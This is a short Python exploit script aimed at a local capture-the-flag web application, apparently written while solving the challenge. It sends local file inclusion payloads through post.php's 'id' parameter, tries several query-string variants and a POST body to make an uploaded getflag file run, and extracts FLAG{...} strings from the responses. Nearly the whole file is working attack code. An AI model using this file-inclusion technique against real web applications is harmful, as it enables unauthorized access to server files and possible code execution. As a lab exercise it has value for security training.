import requests

base_url = "http://127.0.0.1:32891"

print("[+] Including getflag.php through LFI with query parameters...")

# When including files in PHP, sometimes query parameters can be passed
# Try various parameter combinations

test_cases = [
    ('uploads/getflag?read=true', 'read=true'),
    ('uploads/getflag?action=read', 'action=read'),
    ('uploads/getflag?cat=1', 'cat=1'),
    ('uploads/getflag?show=1', 'show=1'),
    ('uploads/getflag?get=1', 'get=1'),
    ('uploads/getflag?flag=1', 'flag=1'),
]

for payload, description in test_cases:
    print(f"\n[+] Testing: {description}")
    resp = requests.get(f"{base_url}/post.php", params={'id': payload})
    
    if "FLAG{" in resp.text:
        print(f"[!!!] FOUND FLAG with {description}!")
        print(resp.text)
        
        # Extract just the flag
        import re
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        for flag in flags:
            print(f"\n[!!!] EXTRACTED FLAG: {flag}")
        break
    elif len(resp.text) != 5637:  # Different from normal getflag inclusion
        print(f"Different response length: {len(resp.text)}")
        print(f"First 300 chars: {resp.text[:300]}")
    else:
        print(f"Same response as before (length {len(resp.text)})")

# Also try with POST to post.php
print("\n[+] Trying POST to post.php with getflag inclusion...")
resp = requests.post(
    f"{base_url}/post.php",
    params={'id': 'uploads/getflag'},
    data={'read': 'true'}
)

if "FLAG{" in resp.text:
    print("[!!!] FOUND FLAG with POST!")
    print(resp.text)

